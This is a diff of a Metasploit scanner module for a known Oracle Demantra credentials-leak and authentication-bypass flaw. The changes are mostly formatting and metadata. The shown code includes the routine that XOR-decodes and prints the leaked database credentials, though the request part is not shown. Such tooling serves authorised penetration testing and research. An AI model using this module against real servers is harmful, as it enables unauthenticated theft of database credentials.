@@ -1,46 +1,48 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Auxiliary::Scanner
   include Msf::Auxiliary::Report
   include Msf::Exploit::Remote::HttpClient
 
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Oracle Demantra Database Credentials Leak',
-      'Description'    => %q{
-        This module exploits a database credentials leak found in Oracle Demantra 12.2.1 in
-        combination with an authentication bypass. This way an unauthenticated user can retrieve
-        the database name, username and password on any vulnerable machine.
-      },
-      'References'     =>
-        [
+    super(
+      update_info(
+        info,
+        'Name' => 'Oracle Demantra Database Credentials Leak',
+        'Description' => %q{
+          This module exploits a database credentials leak found in Oracle Demantra 12.2.1 in
+          combination with an authentication bypass. This way an unauthenticated user can retrieve
+          the database name, username and password on any vulnerable machine.
+        },
+        'References' => [
           [ 'CVE', '2013-5795'],
           [ 'CVE', '2013-5880'],
           [ 'URL', 'https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2013-5795/'],
           [ 'URL', 'https://www.portcullis-security.com/security-research-and-downloads/security-advisories/cve-2013-5880/' ]
         ],
-      'Author'         =>
-        [
+        'Author' => [
           'Oliver Gruskovnjak'
         ],
-      'License'        => MSF_LICENSE,
-      'DisclosureDate' => "Feb 28 2014"
-    ))
+        'License' => MSF_LICENSE,
+        'DisclosureDate' => '2014-02-28',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
         Opt::RPORT(8080),
-        OptBool.new('SSL',   [false, 'Use SSL', false])
-      ], self.class)
-
-    deregister_options('RHOST')
+        OptBool.new('SSL', [false, 'Use SSL', false])
+      ]
+    )
   end
 
   def run_host(ip)
@@ -67,12 +69,11 @@ class MetasploitModule < Msf::Auxiliary
 
       vprint_status("String received: #{res.body.to_s}") unless res.body.blank?
 
-      res.body.to_s.split(",").each do|c|
+      res.body.to_s.split(",").each do |c|
         i = c.to_i ^ 0x50
         creds += i.chr
       end
       print_good("Credentials decoded: #{creds}") unless creds.empty?
     end
   end
-
 end
